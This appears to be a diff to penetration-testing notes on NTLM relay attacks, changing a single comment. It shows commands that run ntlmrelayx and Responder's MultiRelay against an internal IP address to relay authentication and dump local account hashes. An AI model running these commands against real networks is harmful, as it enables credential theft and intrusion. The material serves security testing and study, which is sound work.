@@ -106,4 +106,4 @@ Use NTLMRelay or MultiRelay to relay the credentials to any SMB server which has
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)      
 
-    /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #All auth requests, dump local account hashes   
+    /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay all auth requests, dump local account hashes   
